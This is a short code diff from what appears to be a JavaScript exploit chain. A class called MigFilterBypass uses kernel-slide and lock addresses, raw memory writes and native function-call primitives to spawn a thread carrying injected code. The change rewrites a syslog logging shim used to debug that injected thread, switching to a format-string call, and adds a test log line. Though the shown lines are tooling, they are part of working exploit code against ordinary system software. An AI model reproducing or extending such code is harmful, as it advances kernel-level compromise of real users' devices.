@@ -8355,8 +8355,9 @@ class MigFilterBypass {
 		//Native.write64(threadMem, lock.kernelSlide);
 		//Native.write64(threadMem + 0x8n, lock.lockAddr);
 		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
-		const syslogShim = "(function(){var _cl=console.log;var _syslog=func_resolve('syslog');var _malloc=func_resolve('malloc');var _memcpy=func_resolve('memcpy');var _m=fcall(_malloc,1024);console.log=function(){var s='';for(var i=0;i<arguments.length;i++){if(i>0)s+=' ';s+=String(arguments[i]);}try{var t=s.length>1020?s.substring(0,1020):s;var cs=get_cstring(t);fcall(_memcpy,_m,cs,t.length+1);fcall(_syslog,5,_m);}catch(e){}_cl.apply(console,arguments);};})();";
-		const threadCode = "fcall_init(); " + syslogShim + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
+		const syslogShim = "(function(){var _cl=console.log;var _syslog=func_resolve('syslog');var _fmt=get_cstring('%s');console.log=function(){var s='';for(var i=0;i<arguments.length;i++){if(i>0)s+=' ';s+=String(arguments[i]);}try{fcall(_syslog,5,_fmt,get_cstring(s.length>1020?s.substring(0,1020):s),0,0,0,0,0);}catch(e){}_cl.apply(console,arguments);};})();";
+		const syslogTest = "console.log('[MIG-SYSLOG] shim active');";
+		const threadCode = "fcall_init(); " + syslogShim + syslogTest + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
 
 		for (let i=0; i<10; i++) {
